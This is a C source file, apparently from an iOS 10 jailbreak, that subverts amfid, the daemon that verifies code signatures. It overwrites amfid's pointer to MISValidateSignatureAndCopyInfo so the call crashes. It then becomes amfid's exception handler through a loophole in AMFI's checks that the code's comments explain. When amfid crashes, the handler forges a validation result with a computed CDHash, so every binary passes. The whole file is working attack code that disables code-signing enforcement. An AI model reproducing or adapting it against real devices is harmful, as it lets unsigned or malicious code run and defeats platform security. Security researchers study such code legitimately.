#include <CoreFoundation/CoreFoundation.h>

#include <dlfcn.h>

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <pthread.h>

#include <mach/mach.h>

#include "patch_amfid.h"

#include "remote_memory.h"
#include "remote_file.h"
#include "remote_ports.h"
#include "remote_call.h"
#include "cdhash.h"

kern_return_t mach_vm_region
(
 vm_map_t target_task,
 mach_vm_address_t *address,
 mach_vm_size_t *size,
 vm_region_flavor_t flavor,
 vm_region_info_t info,
 mach_msg_type_number_t *infoCnt,
 mach_port_t *object_name
 );

// find the lowest mapped address in the target task
uint64_t binary_load_address(mach_port_t tp) {
  kern_return_t err;
  mach_msg_type_number_t region_count = VM_REGION_BASIC_INFO_COUNT_64;
  memory_object_name_t object_name = MACH_PORT_NULL; /* unused */
  mach_vm_size_t target_first_size = 0x1000;
  mach_vm_address_t target_first_addr = 0x0;
  struct vm_region_basic_info_64 region = {0};
  err = mach_vm_region(tp,
                       &target_first_addr,
                       &target_first_size,
                       VM_REGION_BASIC_INFO_64,
                       (vm_region_info_t)&region,
                       &region_count,
                       &object_name);
  
  if (err != KERN_SUCCESS) {
    printf("failed to get the region\n");
    return 0;
  }
  
  return target_first_addr;
}


uint64_t do_validate_hook(mach_port_t task_port,
                          uint64_t cfstr_path,
                          uint64_t cfdict_options)
{
  // get cstring pointer from the CFString:
  uint64_t remote_cstr = (uint64_t) call_remote(task_port, CFStringGetCStringPtr, 2,
                                                REMOTE_LITERAL(cfstr_path),
                                                REMOTE_LITERAL(kCFStringEncodingASCII)); // is that a reasonable string encoding that will always work?
  
  if (remote_cstr == 0) {
    printf("failed to get the cstring representation of the file to be verified\n");
    return 0;
  }
  
  uint64_t remote_cstr_len = (uint64_t) call_remote(task_port, strlen, 1,
                                                    REMOTE_LITERAL(remote_cstr));
  
  printf("remote cstring length: %llx\n", remote_cstr_len);
  
  char* local_cstring = malloc(remote_cstr_len+1);
  remote_read_overwrite(task_port, remote_cstr, (uint64_t)local_cstring, remote_cstr_len+1);
  
  printf("request to verify: %s\n", local_cstring);
  
#if 0
  // open the file in the context of amfid and give us the file descriptor:
  int fd = remote_open(task_port, local_cstring, O_RDONLY, 0);
  if (fd < 0) {
    printf("remote open failed for that binary\n");
  }
  
  printf("got fd for file: %d\n", fd);
#endif
  
  // this might be a fat binary in which case we don't know which architecture to verify
  // AMFI tells amfid this and it ends up in the options dictionary passed to this hook as a CFNum
  
  // the keys are CFStrings, rather than having to create them we can use the constants exported by libmis:
  // find the address of MISValidateSignatureAndCopyInfo
  // (could also do the dlsym call remotely in amfid?)
  void* libmis_handle = dlopen("libmis.dylib", RTLD_NOW);
  //printf("libmis handle: %p\n", libmis_handle);
  if (libmis_handle == NULL){
    return 0;
  }
  
  uint64_t* universal_file_offset = (uint64_t*)dlsym(libmis_handle, "kMISValidationOptionUniversalFileOffset");
  if (universal_file_offset == 0){
    printf("unable to resolve kMISValidationOptionUniversalFileOffset\n");
    return 0;
  }
  printf("kMISValidationOptionUniversalFileOffset: 0x%llx", *universal_file_offset);
  
  uint64_t remote_cfnum = (uint64_t) call_remote(task_port, CFDictionaryGetValue, 2,
                                                 REMOTE_LITERAL(cfdict_options),
                                                 REMOTE_LITERAL(*universal_file_offset));
  if (remote_cfnum == 0) {
    printf("failed to get universalfileoffset value from remote cfdict\n");
    return 0;
  }
  
  printf("got universalfileoffset CFNum pointer: %llx\n", remote_cfnum);
  
  // get that as an integer:
  uint64_t fat_file_offset = 0xffffffff;
  int status = (int) call_remote(task_port, CFNumberGetValue, 3,
                                 REMOTE_LITERAL(remote_cfnum),
                                 REMOTE_LITERAL(kCFNumberLongLongType),
                                 REMOTE_OUT_BUFFER(&fat_file_offset, 8));
  
  if (status == 0) {
    printf("failed to get the raw value for the universalfileoffset? %llx\n", fat_file_offset);
    return 0;
  }
  
  printf("universal file offset: %llx\n", fat_file_offset);
  
  uint8_t cdhash[AMFID_HASH_SIZE];
  get_hash_for_amfid(task_port, local_cstring, fat_file_offset, cdhash);
  
  //printf("cdhash: ");
  //for (int i = 0; i < sizeof(cdhash); i++) {
  //  printf("%02x", cdhash[i]);
  //}
  //printf("\n");
  
  // wrap the hash in a remote CFData:
  uint64_t remote_cfdata = (uint64_t) call_remote(task_port, CFDataCreate, 3,
                                                  REMOTE_LITERAL(0),
                                                  REMOTE_BUFFER(cdhash, sizeof(cdhash)),
                                                  REMOTE_LITERAL(sizeof(cdhash)));
  if (remote_cfdata == 0) {
    printf("unable to allocate remote CFData object containing the CdHash\n");
    return 0;
  }
  
  // the constant cfstring:
  uint64_t cdhash_key = *((uint64_t*) (dlsym(libmis_handle, "kMISValidationInfoCdHash")) );
  
  // build the output CFDictionary:
  uint64_t remote_result_dict = (uint64_t) call_remote(task_port, CFDictionaryCreate, 6,
                                                       REMOTE_LITERAL(0),
                                                       REMOTE_BUFFER(&cdhash_key, sizeof(cdhash_key)),
                                                       REMOTE_BUFFER(&remote_cfdata, sizeof(remote_cfdata)),
                                                       REMOTE_LITERAL(1),
                                                       REMOTE_LITERAL(&kCFTypeDictionaryKeyCallBacks),
                                                       REMOTE_LITERAL(&kCFTypeDictionaryValueCallBacks));
  
  if (remote_result_dict == 0) {
    printf("failed to build remote results dictionary\n");
    return 0;
  }
  printf("built remote results dictionary: 0x%llx\n", remote_result_dict);
  
  return remote_result_dict;
}


//mach_port_t amfid_exception_port = MACH_PORT_NULL;

#pragma pack(4)
typedef struct {
  mach_msg_header_t Head;
  mach_msg_body_t msgh_body;
  mach_msg_port_descriptor_t thread;
  mach_msg_port_descriptor_t task;
  NDR_record_t NDR;
} exception_raise_request; // the bits we need at least

typedef struct {
  mach_msg_header_t Head;
  NDR_record_t NDR;
  kern_return_t RetCode;
} exception_raise_reply;
#pragma pack()

// dump the buffer as qwords:
void dword_hexdump(void* buf, size_t len){
  uint32_t* words = (uint32_t*)buf;
  size_t n_words = len / sizeof(uint32_t);
  
  for (size_t i = 0; i < n_words; i++){
    printf("+%08lx %08x\n", i*sizeof(uint32_t), words[i]);
  }
}

void qword_hexdump(void* buf, size_t len){
  uint64_t* words = (uint64_t*)buf;
  size_t n_words = len / sizeof(uint64_t);
  
  for (size_t i = 0; i < n_words; i++){
    printf("+%08lx %016llx\n", i*sizeof(uint64_t), words[i]);
  }
}

void
set_hardware_breakpoint(mach_port_t thread_port, uint64_t pc)
{
  kern_return_t err;
  
  // get the debug state for the thread:
  _STRUCT_ARM_DEBUG_STATE64 old_state = {0};
  mach_msg_type_number_t old_stateCnt = sizeof(old_state)/4;
  err = thread_get_state(thread_port, ARM_DEBUG_STATE64, (thread_state_t)&old_state, &old_stateCnt);
  if (err != KERN_SUCCESS){
    printf("error getting thread debug state: %s\n", mach_error_string(err));
    return;
  }
  
  // set the hardware breakpoint:
  _STRUCT_ARM_DEBUG_STATE64 new_state = {0};
  memcpy(&new_state, &old_state, sizeof(new_state));
  
  new_state.__bvr[0] = pc;
  new_state.__bcr[0] = 1 | (1<<2) | (0xf << 5); // enabled | user
  
  // set the new thread state:
  err = thread_set_state(thread_port, ARM_DEBUG_STATE64, (thread_state_t)&new_state, sizeof(new_state)/4);
  if (err != KERN_SUCCESS) {
    printf("failed to set new thread debug state %s\n", mach_error_string(err));
  } else {
    printf("set new debug state for amfid!\n");
  }
}

uint64_t crashy_pc = 0x686168616861; // ;)

uint64_t correct_pc = 0;

void* amfid_exception_handler(void* arg){
  mach_port_t amfid_exception_port = (mach_port_t)arg;
  
  uint32_t size = 0x1000;
  mach_msg_header_t* msg = malloc(size);
  for(;;){
    kern_return_t err;
    printf("calling mach_msg to receive exception message from amfid on port %x\n", amfid_exception_port);
    err = mach_msg(msg,
                   MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE, // no timeout
                   0,
                   size,
                   amfid_exception_port,
                   0,
                   0);
    
    if (err != KERN_SUCCESS){
      printf("error receiving on exception port: %s\n", mach_error_string(err));
      continue;
    }
    
    printf("got exception message from amfid!\n");
    //dword_hexdump(msg, msg->msgh_size);
    
    exception_raise_request* req = (exception_raise_request*)msg;
    
    mach_port_t thread_port = req->thread.name;
    mach_port_t task_port = req->task.name;
    _STRUCT_ARM_THREAD_STATE64 old_state = {0};
    mach_msg_type_number_t old_stateCnt = sizeof(old_state)/4;
    err = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt);
    if (err != KERN_SUCCESS){
      printf("error getting thread state: %s\n", mach_error_string(err));
      continue;
    }
    
    printf("got thread state\n");
    //dword_hexdump((void*)&old_state, sizeof(old_state));
    
    printf("crashing pc: 0x%llx\n", old_state.__pc);
    
    if (old_state.__pc != crashy_pc) {
      printf("***** unexpected crash *****\n");
      // by returning an error code we'll actually get a nice crash report from ReportCrash too
      
      printf("lr: %016llx\n", old_state.__lr);
      printf("fp: %016llx\n", old_state.__fp);
      printf("sp: %016llx\n", old_state.__sp);
      
      for (int i = 0; i < 29; i++) {
        printf("x%02d: %016llx\n", i, old_state.__x[i]);
      }
      
      printf("stack:\n");
      uint64_t stack_page = (uint64_t)malloc(0x4000);
      remote_read_overwrite(task_port, old_state.__sp, stack_page, 0x4000);
      qword_hexdump((void*)stack_page, 200);
      
      printf("sending failure message\n");
      // return a failure message:
      exception_raise_reply reply = {0};
      
      reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(req->Head.msgh_bits), 0);
      reply.Head.msgh_size = sizeof(reply);
      reply.Head.msgh_remote_port = req->Head.msgh_remote_port;
      reply.Head.msgh_local_port = MACH_PORT_NULL;
      reply.Head.msgh_id = req->Head.msgh_id + 100;
      
      reply.NDR = req->NDR;
      reply.RetCode = KERN_FAILURE;
      
      err = mach_msg(&reply.Head,
                     MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                     (mach_msg_size_t)sizeof(reply),
                     0,
                     MACH_PORT_NULL,
                     MACH_MSG_TIMEOUT_NONE,
                     MACH_PORT_NULL);
      
      mach_port_deallocate(mach_task_self(), thread_port);
      mach_port_deallocate(mach_task_self(), task_port);
      
      if (err != KERN_SUCCESS){
        printf("failed to send the reply to the exception message %s\n", mach_error_string(err));
      } else{
        printf("replied to the amfid exception...\n");
      }
      return NULL;
    }

    
    // lets compute the correct CDHash
    // "hook" has been called with these areguments:
    // x0: CFString for the path to the binary to validate
    // x1: CFDictionary of options:
    //       {"UniversalFileOffset": CFNum(offset_if_fat),
    //        "RespectUppTrustAndAuthorization": CFBooleanTrue,
    //        "ValidateSignatureOnly": CFBooleanTrue}
    // x2: outptr to a CFDictionary* which should contain:
    //       {"CdHash": CFData(cdhash bytes)}
    
    // if we just parse and create those structures then we don't have to know any specifics about this build
    // eg register allocation, offsets
    
    uint64_t result_dictionary = do_validate_hook(task_port, old_state.__x[0], old_state.__x[1]);
    
    _STRUCT_ARM_THREAD_STATE64 new_state = {0};
    memcpy(&new_state, &old_state, sizeof(_STRUCT_ARM_THREAD_STATE64));

    
    // fix up
    //new_state.__pc = correct_pc;
    
    // x2 is an outptr:
    remote_write(task_port, old_state.__x[2], result_dictionary, sizeof(result_dictionary));
    
    // return:
    new_state.__pc = old_state.__lr;
    new_state.__x[0] = 0;
    
    //set_hardware_breakpoint(thread_port, old_state.__lr + 4);
    
    // set the new thread state:
    err = thread_set_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&new_state, sizeof(new_state)/4);
    if (err != KERN_SUCCESS) {
      printf("failed to set new thread state %s\n", mach_error_string(err));
    } else {
      printf("set new state for amfid!\n");
    }
    
    exception_raise_reply reply = {0};
    
    reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(req->Head.msgh_bits), 0);
    reply.Head.msgh_size = sizeof(reply);
    reply.Head.msgh_remote_port = req->Head.msgh_remote_port;
    reply.Head.msgh_local_port = MACH_PORT_NULL;
    reply.Head.msgh_id = req->Head.msgh_id + 100;
    
    reply.NDR = req->NDR;
    reply.RetCode = KERN_SUCCESS;
    
    err = mach_msg(&reply.Head,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   (mach_msg_size_t)sizeof(reply),
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    
    mach_port_deallocate(mach_task_self(), thread_port);
    mach_port_deallocate(mach_task_self(), task_port);
    
    if (err != KERN_SUCCESS){
      printf("failed to send the reply to the exception message %s\n", mach_error_string(err));
    } else{
      printf("replied to the amfid exception...\n");
    }
  }
  return NULL;
}


void setup_exception_handler(mach_port_t amfid_task_port){
  kern_return_t err;
  mach_port_t amfid_exception_port = MACH_PORT_NULL;
  // allocate a port to receive exceptions on:
  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amfid_exception_port);
  //mach_port_insert_right(mach_task_self(), amfid_exception_port, amfid_exception_port, MACH_MSG_TYPE_MAKE_SEND);
  
  
  // We can't set this ourselves as AMFI associates labels with exception_actions
  // which get the creds of the *setter*, regardless of which task port you call the method on
  // this is presumably to try to restrict who can be the exception handler for a task, even if they
  // have a send right to the task's task port.
  // There is however no restriction on tasks setting their own task port
  // amfi_exc_action_check_exception_send explicitly allows this:
  //   "AMFI: allowing exception handler for %s (%d) because it is handling itself."
  // that path is reached if the pid and pid generation number of the sender of the exception message
  // and the task which set the exception port match.
  // It doesn't take into account who actually has the receive right for the exception port though,
  // so we can just get amfid to make the call passing a port for which we hold the receive right
  
  // push a send right to the exception port into amfid:
  mach_port_name_t remote_exception_port_name = push_local_port(amfid_task_port,
                                                                amfid_exception_port,
                                                                MACH_MSG_TYPE_MAKE_SEND);
  
  if (remote_exception_port_name == MACH_PORT_NULL) {
    printf("failed to push a send right to the exception port into amfid\n");
    return;
  }

  // get amfid's name for it's send right to it's task port:
  mach_port_name_t amfids_name_for_its_task_port = (mach_port_name_t) call_remote(amfid_task_port, task_self_trap, 0);

#if 0
  // instead just allocate the receive right directly in the other task, insert
  mach_port_t amfids_name_for_exception_port = MACH_PORT_NULL;
  kern_return_t err;
  
  err = mach_port_allocate(amfid_task_port, MACH_PORT_RIGHT_RECEIVE, &amfids_name_for_exception_port);
  if (err != KERN_SUCCESS) {
    printf("failed to allocate a new receive right in amfid %s %x\n", mach_error_string(err), err);
    return;
  }
  
  // give it a send right:
  err = mach_port_insert_right(amfid_task_port, amfids_name_for_exception_port, amfids_name_for_exception_port, MACH_MSG_TYPE_MAKE_SEND);
  if (err != KERN_SUCCESS) {
    printf("failed to give amfid a send right to the exception port %s %x\n", mach_error_string(err), err);
    return;
  }
#endif
  err = (kern_return_t) call_remote(amfid_task_port, task_set_exception_ports, 5,
                                    REMOTE_LITERAL(amfids_name_for_its_task_port),
                                    REMOTE_LITERAL(/*EXC_MASK_BAD_ACCESS*/EXC_MASK_ALL),
                                    REMOTE_LITERAL(remote_exception_port_name),
                                    REMOTE_LITERAL(EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES), // we want to receive a catch_exception_raise message with the thread port for the crashing thread
                                    REMOTE_LITERAL(ARM_THREAD_STATE64));
  
  if (err != KERN_SUCCESS){
    printf("error setting amfid exception port: %s\n", mach_error_string(err));
  } else {
    printf("set amfid exception port\n");
  }
#if 0
  // pull the receive right into this processes:
  mach_port_t local_name_for_exception_port_receive_right = pull_remote_port(amfid_task_port, amfids_name_for_exception_port, MACH_MSG_TYPE_MOVE_RECEIVE);
  if (local_name_for_exception_port_receive_right == MACH_PORT_NULL) {
    printf("failed to move the exception port receive right into this process\n");
    return;
  }
  printf("got receive right for the exception port: %x\n", local_name_for_exception_port_receive_right);
  
  // amfid still has the send right so deallocate that leaving no trace of the port in amfid's port namespace:
  err = mach_port_deallocate(amfid_task_port, amfids_name_for_exception_port);
  if (err != KERN_SUCCESS) {
    printf("failed to deallocate amfids send right to its exception port %s %x\n", mach_error_string(err), err);
    return;
  }
#endif
  
  // spin up a thread to handle exceptions:
  pthread_t exception_thread;
  pthread_create(&exception_thread, NULL, amfid_exception_handler, (void*)amfid_exception_port);
}


// use the same technique as in mach_portal to "patch" amfid
// without breaking its code signature so that it allows all
// signatures
// do it a bit more generically this time so we can support all 64 bit iOS 10 devices
void patch_amfid(mach_port_t amfid_task_port)
{
  // make ourselves the exception port handler for amfid
  setup_exception_handler(amfid_task_port);
  
  // find the base address of the loaded amfid binary
  // it will be the lowest thing in the address space
  uint64_t amfid_load_address = binary_load_address(amfid_task_port);
  printf("amfid load address: 0x%llx\n", amfid_load_address);
  
  // find the address of MISValidateSignatureAndCopyInfo
  // (could also do the dlsym call remotely in amfid?)
  void* libmis_handle = dlopen("libmis.dylib", RTLD_NOW);
  printf("libmis handle: %p\n", libmis_handle);
  if (libmis_handle == NULL){
    return;
  }
  
  void* sym = dlsym(libmis_handle, "MISValidateSignatureAndCopyInfo");
  if (sym == NULL){
    printf("unable to resolve MISValidateSignatureAndCopyInfo\n");
    return;
  }
  
  correct_pc = (uint64_t)sym;
  
  printf("MISValidateSignatureAndCopyInfo: %p\n", sym);
  
  // find that address in amfid's __la_symbol_ptr segment
  // it won't be too far in:
  uint64_t buf_size = 0x8000;
  uint8_t* buf = malloc(buf_size);
  
  remote_read_overwrite(amfid_task_port, amfid_load_address, (uint64_t)buf, buf_size);
  uint8_t* found_at = memmem(buf, buf_size, &sym, sizeof(sym));
  if (found_at == NULL){
    printf("unable to find MISValidateSignatureAndCopyInfo in __la_symbol_ptr\n");
    return;
  }
  
  uint64_t patch_offset = found_at - buf;
  
  printf("patch_offset: 0x%llx\n", patch_offset);
  
  // patch that to something which will crash:
  //uint64_t crashy_value = 0x414141410000;
 
  
  uint64_t crash_addr = amfid_load_address + patch_offset;
  printf("writing crashy value to 0x%llx\n", crash_addr);
  //remote_write(amfid_task_port, crash_addr, (uint64_t)&crashy_value, sizeof(crashy_value));
  
  remote_write(amfid_task_port, crash_addr, (uint64_t)&crashy_pc, 8);
  
  // write back the value it should have had to start with:
  //remote_write(amfid_task_port, crash_addr, (uint64_t)&sym, 8);
  
  // try opening a file remotely and moving the fd back here:
  //int fd = remote_open(amfid_task_port, "/sbin/launchd", 0, 0);
  
  //printf("fd: %d\n", fd);
  
}
